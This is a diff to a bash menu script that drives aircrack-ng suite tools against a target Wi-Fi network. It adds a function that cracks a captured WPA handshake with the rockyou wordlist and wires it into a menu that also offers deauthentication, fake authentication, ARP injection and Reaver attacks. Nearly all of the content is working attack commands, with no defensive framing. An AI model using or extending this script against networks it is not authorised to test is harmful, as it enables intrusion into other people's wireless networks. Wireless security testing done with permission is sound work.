@@ -12,17 +12,20 @@ else
 gnome-terminal -x sh -c 'aireplay-ng -1 0 -a "$targetBSSID" -e "$targetESSID" "$interfaceName"; exec bash' 
 fi
 }
+function AircrackCap()
+{
+gnome-terminal -x sh -c 'aircrack-ng -a2 -b "$targetBSSID" -w /usr/share/wordlists/rockyou.txt airodumpcap*.cap; exec bash'
+}
 function InjectARP()
 {
 gnome-terminal -x sh -c 'aireplay-ng -3 -b "$targetBSSID" "$interfaceName"; exec bash'
 }
 function Airodump()
 {
-    rm airodumpcap*
-    rm airodumpcap*
-    rm airodumpcap*
-    rm airodumpcap*
-    rm airodumpcap*
+    rm *.cap
+    rm airodump*
+    rm airodump*
+    rm airodump*
 	gnome-terminal -x sh -c 'airodump-ng -c "$targetChannel" --bssid "$targetBSSID" -w airodumpcap12 "$interfaceName"; exec bash'
 return
 }
@@ -40,7 +43,7 @@ function Deauth()
 	}
 function Aircrack()
 {
-gnome-terminal -x sh -c 'aircrack-ng -w airdump --bssid "$targetBSSID" airodumpcap12-01.cap; exec bash'
+gnome-terminal -x sh -c 'aircrack-ng -w airdump --bssid "$targetBSSID" airodumpcap11.cap; exec bash'
 }
 function CafeLate()
 {
@@ -128,7 +131,7 @@ startAttack
 ##############################
 function startAttack()
 {
-echo "What would you like to do? 1 - Airodump 2 - FakeAuth 3 - InjectARP 4 - Aircrack 5 - Besside 6 - Wesside 7 - Wash 8 - Reaver 9 - CafeLate 10 - Deauth 11 - Normalize and Exit"
+echo "What would you like to do? 1 - Airodump 2 - FakeAuth 3 - InjectARP 4 - Aircrack 5 - Besside 6 - Wesside 7 - Wash 8 - Reaver 9 - CafeLate 10 - Deauth 11 - AircrackCap 12 - Normalize and Exit"
 read attackType
 case $attackType in
     1)
@@ -171,6 +174,10 @@ case $attackType in
     Deauth
     ;;
     11)
+    AircrackCap
+    startAttack
+    ;;
+    12)
     Normalize
     ;;
     
